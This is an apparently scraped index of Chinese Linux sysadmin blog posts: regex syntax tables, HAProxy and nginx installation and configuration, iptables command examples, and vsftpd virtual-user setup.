正则表达式的基本组成部分。 正则表达式 描述 示例 Basic RegEx Extended RegEx Python RegEx Perl regEx \\ 转义符，将特殊字符进行转义，忽略其特殊意义 a\\.b匹配a.b，但不能匹配ajb，.被转义为特殊意义 \\ \\ \\ \\ ^ 匹配行首，awk中，^则是匹配字符串的开始 ^tux匹配以tux开头的行 ^ ^ ^ ^ $ 匹配行尾，awk中，$则是匹配字符串的结尾 tux$匹配以tux结尾的行 $ $ $ $ . 匹配除换行符\\n之外的任意单个字符，awk中则可以 ab.匹配abc或ab+，不可匹配abcd或abde，只能匹配单字符 . . . . [] 匹配包含在[字符]之中的任意一个字符 coo[kl]可以匹配cook或cool [] [] [] [] [^] 匹配[^字符]之外的任意一个字符 123[^45]不可以匹配1234或1235，但1231、1232、1236、1237可以 [^] [^] [^] [^] [-] 匹配[]中指定范围内的任意一个字符，要写成递增 [0-9]可以匹配1、2或3等其中任意一个数字 [-] [-] [-] [-] ? 匹配之前的项1次或者0次 colou?r可以匹配color或者colour，不能匹配colouur 不支持 ? ? ? + 匹配之前的项1次或者多次 sa-6+匹配sa-6、sa-666，不能匹配sa- 不支持 + + + * 匹配之前的项0次或者多次 co*l匹配cl、col、cool、coool等 * * * * () 匹配表达式，创建一个用于匹配的子串 ma(tri)?匹配max或maxtrix 不支持 () () () {n} 匹配之前的项n次，n是可以为0的正整数 [0-9]{3}匹配任意一个三位数，可以扩展为[0-9][0-9][0-9] 不支持 {n} {n} {n} {n,} 之前的项至少需要匹配n次 [0-9]{2,}匹配任意一个两位数或更多位数 不支持 {n,} {n,} {n,} {n,m} 指定之前的项至少匹配n次，最多匹配m次，n\u003c=m [0-9]{2,5}匹配从两位数到五位数之间的任意一个数字 不支持 {n,m} {n,m} {n,m} ` ` 交替匹配 两边的任意一项`ab(c d)匹配abc或abd` 不支持 ` 3. POSIX字符类 POSIX字符类是一个形如[:...:]的特殊元序列（meta sequence），他可以用于匹配特定的字符范围。 正则表达式 描述 示例 Basic RegEx Extended RegEx Python RegEx Perl regEx [:alnum:] 匹配任意一个字母或数字字符 [[:alnum:]]+ [:alnum:] [:alnum:] [:alnum:] [:alnum:] [:alpha:] 匹配任意一个字母字符（包括大小写字母） [[:alpha:]]{4} [:alpha:] [:alpha:] [:alpha:] [:alpha:] [:blank:] 空格与制表符（横向和纵向） [[:blank:]]* [:blank:] [:blank:] [:blank:] [:blank:] [:digit:] 匹配任意一个数字字符 [[:digit:]]? [:digit:] [:digit:] [:digit:] [:digit:] [:lower:] 匹配小写字母 [[:lower:]]{5,} [:lower:] [:lower:] [:lower:] [:lower:] [:upper:] 匹配大写字母 ([[:upper:]]+)? [:upper:] [:upper:] [:upper:] [:upper:] [:punct:] 匹配标点符号 [[:punct:]] [:punct:] [:punct:] [:punct:] [:punct:] [:space:] 匹配一个包括换行符、回车等在内的所有空白符 [[:space:]]+ [:space:] [:space:] [:space:] [:space:] [:graph:] 匹配任何一个可以看得见的且可以打印的字符 [[:graph:]] [:graph:] [:graph:] [:graph:] [:graph:] [:xdigit:] 任何一个十六进制数（即：0-9，a-f，A-F） [[:xdigit:]]+ [:xdigit:] [:xdigit:] [:xdigit:] [:xdigit:] [:cntrl:] 任何一个控制字符（ASCII字符集中的前32个字符) [[:cntrl:]] [:cntrl:] [:cntrl:] [:cntrl:] [:cntrl:] [:print:] 任何一个可以打印的字符 [[:print:]] [:print:] [:print:] [:print:] [:print:] 4. 元字符 元字符（meta character）是一种Perl风格的正则表达式，只有一部分文本处理工具支持它，并不是所有的文本处理工具都支持。 正则表达式 描述 示例 Basic RegEx Extended RegEx Python RegEx Perl regEx \\b 单词边界 \\bcool\\b 匹配cool，不匹配coolant \\b \\b \\b \\b \\B 非单词边界 cool\\B 匹配coolant，不匹配cool \\B \\B \\B \\B \\d 单个数字字符 b\\db 匹配b2b，不匹配bcb 不支持 不支持 \\d \\d \\D 单个非数字字符 b\\Db 匹配bcb，不匹配b2b 不支持 不支持 \\D \\D \\w 单个单词字符（字母、数字与_） \\w 匹配1或a，不匹配\u0026 \\w \\w \\w \\w \\W 单个非单词字符 \\W 匹配\u0026，不匹配1或a \\W \\W \\W \\W \\n 换行符 \\n 匹配一个新行 不支持 不支持 \\n \\n \\s 单个空白字符 x\\sx 匹配x x，不匹配xx 不支持 不支持 \\s \\s \\S 单个非空白字符 x\\S\\x 匹配xkx，不匹配xx 不支持 不支持 \\S \\S \\r 回车 \\r 匹配回车 不支持 不支持 \\r \\r \\t 横向制表符 \\t 匹配一个横向制表符 不支持 不支持 \\t \\t \\v 垂直制表符 \\v 匹配一个垂直制表符 不支持 不支持 \\v \\v \\f 换页符 \\f 匹配一个换页符 不支持 不支持 \\f \\f ","date":"2019-04-28","objectID":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/:0:0","tags":["linux","正则","解决方案"],"title":"正则表达式介绍","uri":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["linux","运维记事","整理收集"],"content":"Haproxy部署与常用操作","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":" 本文参考以下内容, 由本站重新整理验证发布 https://zhang.ge/5125.html https://www.kancloud.cn/tuna_dai_/day01/369367 1. 简介 HAProxy提供高可用性、负载均衡以及基于TCP和HTTP应用的代理，支持虚拟主机，它是免费、快速并且可靠的一种解决方案。 HAProxy特别适用于那些负载特大的web站点，这些站点通常又需要会话保持或七层处理。 HAProxy运行在当前的硬件上，完全可以支持数以万计的并发连接。并且它的运行模式使得它可以很简单安全的整合进您当前的架构中， 同时可以保护你的web服务器不被暴露到网络上。 HAProxy实现了一种事件驱动, 单一进程模型，此模型支持非常大的并发连接数。多进程或多线程模型受内存限制 、系统调度器限制以及无处不在的锁限制，很少能处理数千并发连接。事件驱动模型因为在有更好的资源和时间管理的用户空间(User-Space) 实现所有这些任务，所以没有这些问题。此模型的弊端是，在多核系统上，这些程序通常扩展性较差。这就是为什么他们必须进行优化以 使每个CPU时间片(Cycle)做更多的工作。 2. 安装 [root@00 software]# wget https://www.haproxy.org/download/1.8/src/haproxy-1.8.19.tar.gz [root@00 software]# tar -xzvf haproxy-1.8.19.tar.gz [root@00 software]# cd haproxy-1.8.19/ # 安装 # 内核版本，使用uname -r查看内核，如：2.6.18-371.el5，此时该参数就为linux26；kernel 大于2.6.28的用：TARGET=linux2628 [root@00 haproxy-1.8.19]# make TARGET=linux2628 ARCH=x86_64 PREFIX=/opt/haproxy # PREFIX=/opt/haproxy-1.8.19 [root@00 haproxy-1.8.19]# make install PREFIX=/opt/haproxy # PREFIX=/opt/haproxy-1.8.19 [root@00 haproxy-1.8.19]# useradd -u 1012 -M -s /sbin/nologin -d /opt/haproxy haproxy [root@00 haproxy-1.8.19]# chown -R haproxy.haproxy /opt/haproxy-1.8.19 # [root@00 haproxy-1.8.19]# ln -s /opt/haproxy-1.8.19 /opt/haproxy 3. 配置 3.1. 规划目录 # haproxy chroot,需要设置所有用户均不具有写权限 [root@00 haproxy-1.8.19]# mkdir /opt/haproxy/chroot \u0026\u0026 chmod 440 /opt/haproxy/chroot # 主配置文件目录 [root@00 haproxy-1.8.19]# mkdir /opt/haproxy/etc # 子配置文件目录，规划enabled 目录为 ready目录内正式启用的软连接文件 [root@00 haproxy-1.8.19]# mkdir /opt/haproxy/etc/{enabled,ready}/{tcp,http} -p # 完整目录结构 [root@00 haproxy-1.8.19]# tree /opt/haproxy/etc/ /opt/haproxy/etc/ ├── enabled │ ├── http │ │ └── example.cfg -\u003e ../../ready/http/example.cfg │ └── tcp ├── haproxy.cfg └── ready ├── http │ └── example.cfg └── tcp 6 directories, 3 files 3.2. 主配置文件 # current config: /opt/haproxy/etc/haproxy.cfg ###### haproxy 进程信息设置 ###### global log 172.10.10. local0 maxconn 4096 #最大连接数 chroot /opt/haproxy/chroot #chroot装录 pidfile /opt/haproxy/haproxy.pid #haproxy pid stats socket /opt/haproxy/haproxy.sock mode 660 level admin #定义统计信息保存的位置,设置权限660，等级设置为管理,防止使用socat与sock通信是权限不够 user haproxy #用户nobody group haproxy #组nobody daemon #守护进程运行 nbproc 1 #进程数量 ##### 默认配置，均可通过后续设置覆盖当前设置 ###### defaults log global mode http #7层 http;4层tcp,如果要让haproxy支持虚拟主机，mode 必须设为http option httplog #记录haproxy 访问日志, http 日志格式 option httpclose #每次请求完毕后主动关闭http通道,haproxy不支持keep-alive,只能模拟这种模式的实现 option redispatch #serverId对应的服务器挂掉后,强制定向到其他健康的服务器 retries 3 #3次连接失败就认为是服务器不可用 option dontlognull #日志中不记录空连接,比如健康检查日志信息 option forwardfor header X-REAL-IP # 转发用户真实ip maxconn 2000 #最大连接数，受系统ulimit 设置影响 timeout connect 3600000 #连接超时(毫秒) timeout client 3600000 #客户端超时(毫秒) timeout server 3600000 #服务器超时(毫秒) listen stats bind 0.0.0.0:8888 stats enable # 显示状态页面 stats hide-version # 隐藏 haproxy 版本号 stats refresh 30s # 页面自动刷新时间 stats uri /haproxy-status # 统计页面url stats realm hello\\ haproxy #统计页面密码框上提示文本 stats auth haproxy:haproxy # 设置监控页面的用户和密码，可以设置多个 #stats auth haproxy:haproxy 3.3. 子配置 # current config: /opt/haproxy/etc/ready/http/example.cfg ###### 前端配置 ###### frontend frontend_www.example.com_1 # bind 0.0.0.0:5000 mode http # acl url_static path_beg -i /static /images /javascript /stylesheets # acl url_static path_end -i .jpg .gif .png .css .js # use_backend static if url_static # 请求转发到那个后端 default_backend backend_www.example.com_1 #--------------------------------------------------------------------- # static backend for serving up images, stylesheets and such #--------------------------------------------------------------------- ###### 后端配置 ###### backend backend_www.example.com_1 option forwardfor header X-REAL-IP # 健康检查，发送一个HEAD请求，验证节点是否存活 option httpchk HEAD / HTTP/1.0 # 负载均衡模式roundrobin(轮询);source(ip hash);static-rr(权重轮询);leastconn(以服务器连接数轮询，连接数最低的优先连接) balance roundrobin # check: 启用健康检查 # inter 默认2秒检查 # rise 检查连续可以的次数，当超过该次数,加入该节点，可用次数一般设置稍大 # 1fall 检查连续不可用的次数，当超过该次数,剔除该节点 server node1 172.10.10.11:8081 check inter 2000 rise 30 fall 15 server node2 172.10.10.12:8081 check inter ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:0:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"Nginx安装维护","date":"2019-04-10","objectID":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/","tags":["linux","nginx"],"title":"Nginx安装维护","uri":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"搭建环境： nginx：1.14.2 服务器：centos7 依赖安装 [root@00 software]# yum install -y gcc glibc gcc-c++ pcre-devel openssl-devel git #安装依赖关系 [root@00 software]# mkdir /opt/software [root@00 software]# cd /opt/software [root@00 software]# wget http://nginx.org/download/nginx-1.14.2.tar.gz # nginx 负载均衡检测模块 # [root@00 software]# git clone https://github.com/yaoweibin/nginx_upstream_check_module.git # vts-status 模块用于替换默认的 http_stub_status_module 启用vts时可以不启用默认的 # [root@00 nginx-1.14.2]# git clone https://github.com/vozlt/nginx-module-vts.git # 编译安装（安装过程若差包直接装上就可以了） [root@00 software]# tar xzvf nginx-1.14.2.tar.gz [root@00 software]# cd nginx-1.14.2 [root@00 nginx-1.14.2]# useradd -d /var/ftproot -s /sbin/nologin www -u 1002 # 负载均衡模块添加,添加对应版本的补丁 # [root@00 nginx-1.14.2]# patch -p1 \u003c ../nginx_upstream_check_module/check_1.14.0+.patch # # 隐藏默认版本号，隐藏默认标识 # sed -i 's#\"1.14.2\"#\"\"#g' ./src/core/nginx.h # sed -i 's#\"NGINX\"#\"0x5c0f\"#g' ./src/core/nginx.h # sed -i 's#\"nginx/\"#\"0x5c0f/\"#g' ./src/core/nginx.h # sed -i 's#\"Server: nginx\"#\"Server: 0x5c0f\"#g' ./src/http/ngx_http_header_filter_module.c # sed -i 's#\u003ccenter\u003enginx\u003c/center\u003e#\u003ccenter\u003e0x5c0f\u003c/center\u003e#g' ./src/http/ngx_http_special_response.c # grep \"0x5c0f\" ./src/http/ngx_http_header_filter_module.c ./src/http/ngx_http_special_response.c ./src/core/nginx.h [root@00 nginx-1.14.2]# ./configure --user=www --group=www --with-http_ssl_module --with-http_stub_status_module --prefix=/opt/nginx-1.14.2 #--with-http_realip_module （建议添加用于日志分析） # --add-module=../nginx_upstream_check_module/ (负载均衡模块编译，新增时注意保留原有参数) # --add-module=../nginx-module-vts/ (负载均衡模块编译，新增时注意保留原有参数) # checking for OS + Linux 2.6.32-71.el6.i686 i686 checking for C compiler ... found + using GNU C compiler + gcc version: 4.4.4 20100726 (Red Hat 4.4.4-13) (GCC) checking for gcc -pipe switch ... found checking for -Wl,-E switch ... found checking for gcc builtin atomic operations ... found checking for C99 variadic macros ... found checking for gcc variadic macros ... found -----忽略部分内容----- nginx path prefix: \"/opt/nginx-1.14.2\" nginx binary file: \"/opt/nginx-1.14.2/sbin/nginx\" nginx modules path: \"/opt/nginx-1.14.2/modules\" nginx configuration prefix: \"/opt/nginx-1.14.2/conf\" nginx configuration file: \"/opt/nginx-1.14.2/conf/nginx.conf\" nginx pid file: \"/opt/nginx-1.14.2/logs/nginx.pid\" nginx error log file: \"/opt/nginx-1.14.2/logs/error.log\" nginx http access log file: \"/opt/nginx-1.14.2/logs/access.log\" nginx http client request body temporary files: \"client_body_temp\" nginx http proxy temporary files: \"proxy_temp\" nginx http fastcgi temporary files: \"fastcgi_temp\" nginx http uwsgi temporary files: \"uwsgi_temp\" nginx http scgi temporary files: \"scgi_temp\" [root@00 software]# make make -f objs/Makefile make[1]: Entering directory `/opt/software/nginx-1.14.2' cc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\ -o objs/src/core/nginx.o \\ src/core/nginx.c -----忽略部分内容----- sed -e \"s|%%PREFIX%%|/opt/nginx-1.14.2|\" \\ -e \"s|%%PID_PATH%%|/opt/nginx-1.14.2/logs/nginx.pid|\" \\ -e \"s|%%CONF_PATH%%|/opt/nginx-1.14.2/conf/nginx.conf|\" \\ -e \"s|%%ERROR_LOG_PATH%%|/opt/nginx-1.14.2/logs/error.log|\" \\ \u003c man/nginx.8 \u003e objs/nginx.8 make[1]: Leaving directory `/opt/software/nginx-1.14.2' [root@00 nginx-1.14.2]# make install make -f objs/Makefile install make[1]: Entering directory `/opt/software/nginx-1.14.2' test -d '/opt/nginx-1.14.2' || mkdir -p '/opt/nginx-1.14.2' test -d '/opt/nginx-1.14.2/sbin' \\ || mkdir -p '/opt/nginx-1.14.2/sbin' ----忽略部分内容----- make[1]: Leaving directory `/opt/software/nginx-1.14.2' [root@00 nginx-1.14.2]# ln -s /opt/nginx-1.14.2/ /opt/nginxssl #创建软连接,用于版本控制,此步骤可以不做 # 负载均衡模块显示配置 # 1. 需要在 upstream 模块中添加检测 # check interval=3000 rise=2 fall=5 timeout=1000 type=http;(每隔3秒检测一次,请求2次正常则标记realserver状态为up,如果检测5次都失败,则标记realserver的状态为down,超过时间为1秒，检查协议为http) # 2. server中添加location (可合并) # location /status { # check_status; # access_log off; # } 启动 [root@00 Des","date":"2019-04-10","objectID":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:0:0","tags":["linux","nginx"],"title":"Nginx安装维护","uri":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","整理收集"],"content":"Nginx主配置文件nginx.conf超详细中文详解","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":" 注意 本文原文出自老男孩微信公众号:oldboyedu, 原文连接已经丢失，现收集于网络转载文本，用于个人整理记录 1. 作者简介 老男孩，北京老男孩IT教育创始人，畅销图书作者，51CTO金牌讲师，16年运维经验及培训经验， IT界顶级Linux集群架构实战与教育专家。 国内IT教育实战心理学运维思想体系创始人，将心理学运维思想大量应用于教学培训实践，成就屌丝无数。所教学生平均就业工资及后期发展速度连续多年在国内同行业排名第一！ 老男孩老师个人博客： http://oldboy.blog.51cto.com http://blog.oldboyedu.com 2. Nginx核心配置文件nginx.conf史上最细中文详解 2.1. 定义Nginx运行的用户和用户组 user nginx nginx; #改为特殊的用户和组 nginxworker 进程数，即处理请求的进程（熟称负责接客的服务员） worker_processes 8; #初始可设置为CPU总核数 2.2. cpu亲和力配置，让不同的进程使用不同的cpu worker_cpu_affinity 0001 0010 0100 1000 0001 00100100 1000; 2.3. 全局错误日志定义类型，[ debug|info|notice|warn|error|crit] error_log logs/error.log error; #一定要设置warn级别以上 2.4. 把进程号记录到文件 pid logs/nginx.pid; #用于管理nginx进程 2.5. Nginxworker最大打开文件数，可设置为系统优化后的ulimit -HSn的结果 worker_rlimit_nofile 65535; 2.6. IO事件模型与worker进程连接数设置 events { #epoll模型是Linux 2.6以上版本内核中的高性能网络I/O模型 use epoll; #单个worker进程最大连接数 worker_connections 10240; #nginx最大连接数=worker连接数*worker进程数 } 2.7. http模块设置部分 http{ server_tokens off; #隐藏响应header和错误通知中的版本号 include mime.types; #文件扩展名与文件类型映射表 default_type application/octet-stream;#默认文件类型 server_names_hash_max_size 512; #服务域名的最大hash表大小 server_names_hash_bucket_size 128;#服务域名的hash表大小 #开启高效文件传输模式，实现内核零拷贝 sendfile on; #激活tcp_nopush参数可以允许把httpresponse header和文件的开始放在一个文件里发布，积极的作用是减少网络报文段的数量 tcp_nopush on; #激活tcp_nodelay，内核会等待将更多的字节组成一个数据包，从而提高I/O性能 tcp_nodelay on; #连接超时时间，单位是秒 keepalive_timeout 120; #目录列表访问参数，合适http下载，默认关闭。 autoindex off; #读取客户端请求头的超时时间（参看老男孩的书籍理解http协议原理） client_header_timeout 15s; #读取客户端请求主体的超时时间（参看老男孩的书籍理解http协议原理） client_body_timeout 60s; #设定读取客户端请求主体的最大大小。（参看老男孩的书籍理解http协议原理） client_max_body_size 8m; #设置服务器端传送http响应信息到客户端的超时时间 send_timeout 60s; #设定访问日志的日志记录格式，每列细节参考《跟老男孩学linux运维》:Web集群实战 log_format main '$remote_addr - $remote_user$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\"$http_x_forwarded_for\"'; #FastCGI参数是和动态服务器交互起作用的参数 #设定Nginx服务器和后端FastCGI服务器连接的超时时间 fastcgi_connect_timeout 60; #设定Nginx允许FastCGI服务端返回数据的超时时间 fastcgi_send_timeout 60; #设定Nginx从FastCGI服务端读取响应信息的超时时间 fastcgi_read_timeout 60; #设定用来读取从FastCGI服务端收到的第一部分响应信息的缓冲区大小 fastcgi_buffer_size 64k; #设定用来读取从FastCGI服务端收到的响应信息的缓冲区大小以及缓冲区数量 fastcgi_buffers 4 64k; #设定系统很忙时可以使用的fastcgi_buffers大小，推荐大小为fastcgi_buffers *2。 fastcgi_busy_buffers_size 128k; #fastcti临时文件的大小，可设置128-256K fastcgi_temp_file_write_size 128k; #gzip压缩模块部分（此部分对于网站优化极其重要） #开启gzip压缩功能。 gzip on; #设置允许压缩的页面最小字节数，页面字节数从header头的Content-Length中获取。默认值是0，表示不管页面多大都进行压缩。建议设置成大于1K。如果小于1K可能会越压越大。 gzip_min_length 1k; #压缩缓冲区大小。表示申请4个单位为16K的内存作为压缩结果流缓存，默认值是申请与原始数据大小相同的内存空间来存储gzip压缩结果。 gzip_buffers 4 16k; #压缩版本（默认1.1，前端为squid2.5时使用1.0）用于设置识别HTTP协议版本，默认是1.1，目前大部分浏览器已经支持GZIP解压，使用默认即可。 gzip_http_version 1.1; #压缩比率。用来指定GZIP压缩比，1压缩比最小，处理速度最快；9压缩比最大，传输速度快，但处理最慢，也比较消耗cpu资源。 gzip_comp_level 2; #用来指定压缩的类型，“text/html”类型总是会被压缩，这个就是HTTP原理部分讲的媒体类型。 gzip_typestext/plain application/x-javascript text/css application/xml; #vary header支持。该选项可以让前端的缓存服务器缓存经过GZIP压缩的页面，例如用Squid缓存经过Nginx压缩的数据。 gzip_vary on; #反向代理负载均衡设定部分（可选） #upstream表示负载服务器池，定义名字为blog.oldboyedu.com的服务器池 upstream blog.oldboyedu.com { #server是服务器节点起始标签，其后是节点地址，可为域名或IP，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。 ip_hash; #调度算法，默认是rr轮询。 server 172.16.1.7:80 weight=1; server 172.16.1.8:80 weight=1; server 172.16.1.9:80 weight=1 backup; #backup表示热备 } ## 设定基于域名的虚拟主机部分 ###oldboy www web php server server { listen 80; #监听的端口，也可以是172.16.1.7:80形式 server_name www.oldboyedu.comoldboyedu.com; #域名 root html/blog; #站点根目录，即网站程序放的目录 location / { #默认访问的location标签段 index index.php index.htmlindex.htm; #首页排序 } location ~.*.(php|php5)?$ { #符合php扩展名的请求调度到fcgi server fastcgi_pass 127.0.0.1:9000; #抛给本机的9000端口(php fastcgi server) fastcgi_index index.php; #设定动态首页 include fastcgi.conf; #设定和fastcgi交互的相关参数包含文件 } ### 将符合静态文件的图片视频流媒体等设定expries缓存参数，要求浏览器缓存。 location~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ { expires 10y; #客户端缓存上述静态数据10年 } ### 将符合js,css文件的等设定expries缓存参数，要求浏览器缓存。 location~ .*\\.(js|css)?$ { expires 30d; #客户端缓存上述js,css数据30天 } access_log /app/logs/www_access.log main; #根据日志格式记录用户访问的日志 } 2.","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:0:0","tags":["linux","nginx"],"title":"Nginx主配置文件nginx.conf超详细中文详解","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","运维记事"],"content":"Iptables常用","date":"2019-03-08","objectID":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/","tags":["linux","iptables"],"title":"Iptables常用","uri":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"1. iptables 工作流程 防火墙是一层一层过滤的，实际是按照配置规则的顺序从上到下，从前到后进行过滤的。 如果匹配上规则，即明确表明是阻止还是通过，此时数据包就不在向下进行新的匹配规则了。 如果所有规则中没有明确表明是阻止还是通过这个数据包，也就是没有匹配上的规则，向下进行匹配，直到匹配默认规则得到明确的阻止还是通过. 防火墙的默认规则是对应链的所有的规则执行完成后才会执行。 2. iptables 表和链 4 表: filter 包过滤，用于防火墙规则。 net 地址转换，用于网关路由器。 mangle 数据包修改（QOS），用于实现服务质量。 raw 高级功能，如：网址过滤。 5链: INPUT链 处理输入数据包。 OUTPUT链 处理输出数据包。 PORWARD链 处理转发数据包。 PREROUTING链 用于目标地址转换（DNAT）。 POSTOUTING链 用于源地址转换（SNAT）。 3. iptables 命令 参数 作用 -F 清空所有规则，不会处理默认规则 -X 删除用户自定义的链 -Z 清空链的计数器 -t 指定表(默认filter) -A 添加规则到指定链的结尾(查找对应链，做什么处理) -I 添加规则到指定链的开头(查找对应链，做什么处理) -P 指定协议: all(默认)、tcp、udp、icmp --dport 指定目的端口(端口范围冒号分割,如:80:89) --sport 指定源端口(端口范围冒号分割,如:80:89) -m multiport --dport/--sport 指定匹配多个端口,需配合(--dport -j 行为 ACCEPT(接受)、DROP(丢弃)、REJECT(拒绝:REJECT会反馈给拒绝对象信息) -s 指定源ip地址 -i 指定进入的网卡 -o 指定出去的网卡 -n 以数字形式显示ip和端口(默认主机名、网络名),需配合-L使用 -L 列出所有规则 -D 删除单条规则 --line-number 显示序号 -m state --state new: 已经或将启动新的连接、ESTABLISHED:已建立的连接、 RELATED: 正在启动的新连接、INVALID: 非法或无法识别的 -m limit --limit n/{second/minute/hour} 限制指定时间包的允许通过数量及并发数 --limit-burst [n] 在同一时间内允许通过的请求n个 4. 示例 清空规则、用户自定义链、链的计数器 [root@00 ~]# iptables -F [root@00 ~]# iptables -X [root@00 ~]# iptables -Z 拒绝规则 [root@00 ~]# iptables -t filter -A INPUT -p tcp --dport 22 -j DROP [root@00 ~]# iptables -t filter -A INPUT -s 172.16.80.0/24 -j DROP [root@00 ~]# iptables -t filter -A INPUT -i eth0 -s 172.16.80.0/24 -j DROP [root@00 ~]# iptables -t filter -A INPUT ! -s 172.16.80.0/24 -j DROP # 拒绝非 172.16.80.0/24 网段进行连接(6.x后!放在-s前面) 匹配ICMP类型 [root@00 ~]# iptables -A INPUT -p icmp --icmp-type 8 -j DROP # 8 代表ping [root@00 ~]# iptables -A INPUT -p icmp --icmp-type 8 -s 172.18.80.0/24 -j DROP [root@00 ~]# 允许关联的状态包(如vsftpd服务) [root@00 ~]# iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT [root@00 ~]# iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT nat 共享网络 # 存在固定的外网地址 [root@00 ~]# iptables -t nat -A POSTROUTING -s 10.0.1.0/24 -o eth1 -j SNAT --to-source 172.16.110.131 # -s 10.0.1.0/24 为办公室或IDC内网网段;-o eth1 为网关的外网网卡接口;-j SNAT --to-source 172.16.110.131 是外网网卡的ip地址 # 存在变化的外网地址(伪装) [root@00 ~]# iptables -t nat -A POSTROUTING -s 10.0.1.0/24 -j MASQUERADE nat 端口转发(一对一映射) # 访问 172.16.80.31:2121转发到 172.16.110.131:22 [root@00 ~]# iptables -t nat -A PREROUTING -p tcp -i eth0 -d 172.16.80.31 --dport 2121 -j DNAT --to 172.16.110.131:22 [root@00 ~]# iptables -t nat -I POSTROUTING -d 172.16.110.131 -j SNAT --to-source 172.16.80.31 ","date":"2019-03-08","objectID":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/:0:0","tags":["linux","iptables"],"title":"Iptables常用","uri":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"Vsftpd安装配置","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/","tags":["linux","ftp","解决方案"],"title":"Vsftpd安装配置","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":" 注意 文章于最后提交日修改过一次，但没有测试，不知道有没有改错 包含虚拟用户和本地用户配置，另还有一个pure-ftp,据说配置便捷不过没有用过 此篇内容就是完全的一个个人记录了，其他人估计是看不懂的。 基础环境: Fedora 25 vsftd 3.0.3 1. 安装 vsftpd 1.1. 虚拟用户 [root@00 ~]# dnf install -y vsftpd 依赖关系解决。 -----省略部分内容----- 运行事务 安装: vsftpd-3.0.3-2.fc25.x86_64 1/1 验证: vsftpd-3.0.3-2.fc25.x86_64 1/1 已安装: vsftpd.x86_64 3.0.3-2.fc25 完毕！ [root@00 vsftpd]# cp -v /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.default [root@00 vsftpd]# grep -v \"#\" /etc/vsftpd/vsftpd.conf.default \u003e/etc/vsftpd/vsftpd.conf # 清空文件注释 此步骤可以不做 1.1.1. 创建虚拟用户配置文件 [root@00 vsftpd]# cd /etc/vsftpd [root@00 vsftpd]# vim .vsftpd_login.list #单数行用户名 偶数行密码 vsftpd01 pw01 vsftpd02 pw02 [root@00 vsftpd]# db_load -T -t hash -f .vsftpd_login.list vsftpd_login.db # 加密配置文件 (原配置文件.vsftpd_login.list可以删除，但如果该配置的用户名密码比较重要且不可更改，建议保留备份至其他地方或增加000权限，以备后续增删改用户时无法知道原配已配置用户名密码；/usr/bin/db_dump -d a /etc/vsftpd/vsftpd_login.db 可以反向查询密码,注意执行前最好先将db文件备个份,不要问我为什么,当你把参数写错了的时候你就知道了) [root@00 vsftpd]# file vsftpd_login.db vsftpd_login.db: Berkeley DB (Hash, version 9, native byte-order) [root@00 vsftpd]# chmod 600 vsftpd_login.db 1.1.2. 创建用于FTP服务存储文件的根目录以及虚拟用户映射的系统本地用户 [root@00 vsftpd]# useradd -u 1010 -d /var/ftproot -s /sbin/nologin www # 指定uid是为了sync使用 [root@00 vsftpd]# chmod -Rf 755 /var/ftproot/ [root@00 vsftpd]# ls -ld /var/ftproot/ drwxr-xr-x. 3 www www 4096 4月 29 11:50 /var/ftproot/ 1.1.3. 建立用于支持虚拟用户的PAM认证文件 [root@00 vsftpd]# cd /etc/vsftpd [root@00 vsftpd]# vim /etc/pam.d/vsftpd auth required pam_userdb.so db=/etc/vsftpd/vsftpd_login account required pam_userdb.so 